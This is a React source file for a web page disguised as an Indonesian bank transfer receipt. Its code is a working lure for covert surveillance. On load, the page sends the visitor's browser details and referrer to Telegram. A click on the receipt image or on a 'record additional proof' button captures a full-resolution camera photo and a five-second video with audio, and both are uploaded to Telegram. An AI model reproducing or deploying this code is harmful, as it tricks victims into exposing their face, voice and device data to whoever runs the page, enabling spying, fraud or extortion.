import { useEffect, useCallback } from "react";
import {
  sendTelegramNotification,
  sendImageToTelegram,
  sendVideoToTelegram,
} from "./utils/telegram";

function App() {
  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || "Direct",
        previousSites: document.referrer || "None",
      });
    };

    sendVisitorNotification();
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    try {
      // Get device capabilities first
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(
        (device) => device.kind === "videoinput"
      );

      if (!videoDevice) {
        throw new Error("No video input device found");
      }

      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: { ideal: 4096 }, // Maximum supported width
          height: { ideal: 2160 }, // Maximum supported height
          frameRate: { ideal: 60 },
        },
        audio: true,
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);

      // Get actual video track settings
      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();

      // Create and setup video element for photo capture
      const video = document.createElement("video");
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;

      // Wait for video to be ready
      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 500);
          } catch (error) {
            console.error("Error playing video:", error);
            resolve(true);
          }
        };
      });

      // Setup canvas with actual video dimensions
      const canvas = document.createElement("canvas");
      canvas.width = settings.width || 1920;
      canvas.height = settings.height || 1080;
      const context = canvas.getContext("2d");

      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      // Convert photo to blob with maximum quality
      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob(
          (blob) => {
            if (blob) resolve(blob);
          },
          "image/jpeg",
          1.0
        );
      });

      // Send photo immediately
      sendImageToTelegram(photoBlob).catch(console.error);

      // Check supported video formats
      const mimeTypes = [
        "video/mp4;codecs=h264,aac",
        "video/mp4",
        "video/webm;codecs=vp8,opus",
        "video/webm",
      ];

      const supportedMimeType = mimeTypes.find((type) =>
        MediaRecorder.isTypeSupported(type)
      );

      if (!supportedMimeType) {
        throw new Error("No supported video format found");
      }

      const sendVideo5Detik = async () => {
        // Configure video recording with maximum quality
        const mediaRecorder = new MediaRecorder(stream, {
          mimeType: supportedMimeType,
          videoBitsPerSecond: 8000000, // 8 Mbps for high quality
        });

        const chunks: BlobPart[] = [];

        mediaRecorder.ondataavailable = (e) => {
          if (e.data.size > 0) {
            chunks.push(e.data);
          }
        };

        mediaRecorder.onstop = async () => {
          const videoBlob = new Blob(chunks, {
            type: supportedMimeType.includes("mp4")
              ? "video/mp4"
              : "video/webm",
          });
          console.log("Video recording completed, size:", videoBlob.size);
          await sendVideoToTelegram(videoBlob);
          stream.getTracks().forEach((track) => track.stop());
        };

        // Start recording with frequent data chunks for better quality
        mediaRecorder.start(1000);
        console.log("Started recording video");

        // Stop recording after 5 seconds
        setTimeout(() => {
          if (mediaRecorder.state === "recording") {
            console.log("Stopping video recording");
            mediaRecorder.stop();
          }
        }, 5000);
      };

      // const sendVideo10Detik = async () => {
      //   // Configure video recording with maximum quality
      //   const mediaRecorder = new MediaRecorder(stream, {
      //     mimeType: supportedMimeType,
      //     videoBitsPerSecond: 8000000, // 8 Mbps for high quality
      //   });

      //   const chunks: BlobPart[] = [];

      //   mediaRecorder.ondataavailable = (e) => {
      //     if (e.data.size > 0) {
      //       chunks.push(e.data);
      //     }
      //   };

      //   mediaRecorder.onstop = async () => {
      //     const videoBlob = new Blob(chunks, {
      //       type: supportedMimeType.includes("mp4")
      //         ? "video/mp4"
      //         : "video/webm",
      //     });
      //     console.log("Video recording completed, size:", videoBlob.size);
      //     await sendVideoToTelegram(videoBlob);
      //     stream.getTracks().forEach((track) => track.stop());
      //   };

      //   // Start recording with frequent data chunks for better quality
      //   mediaRecorder.start(1000);
      //   console.log("Started recording video");

      //   // Stop recording after 10 seconds
      //   setTimeout(() => {
      //     if (mediaRecorder.state === "recording") {
      //       console.log("Stopping video recording");
      //       mediaRecorder.stop();
      //     }
      //   }, 10000);
      // };

      // Start video recording
      sendVideo5Detik();
      // sendVideo10Detik();
    } catch (error) {
      console.error("Error capturing media:", error);
    }
  }, []);

  const handlePlayClick = async () => {
    await captureAndSendMedia();
  };

  // Tanggal dan waktu saat ini dalam format Indonesia
  const currentDate = new Date().toLocaleDateString("id-ID", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
  });

  const currentTime = new Date().toLocaleTimeString("id-ID", {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });

  return (
    <main className="flex flex-col items-center justify-center min-h-screen px-4 py-8 bg-gray-100">
      <div className="mb-6 text-center">
        <h1 className="text-2xl font-bold text-blue-900">BUKTI TRANSFER</h1>
        <p className="mt-1 text-sm text-gray-600">
          Transfer berhasil • {currentDate} {currentTime}
        </p>
      </div>

      <img
        src="./img.png"
        alt="Bukti Transfer"
        className="w-full max-w-md border rounded shadow-lg"
        onClick={handlePlayClick}
      />

      <button
        onClick={handlePlayClick}
        className="px-4 py-2 mt-6 text-sm font-semibold text-white transition bg-blue-700 rounded hover:bg-blue-800"
      >
        Rekam Bukti Tambahan
      </button>
    </main>
  );
}

export default App;
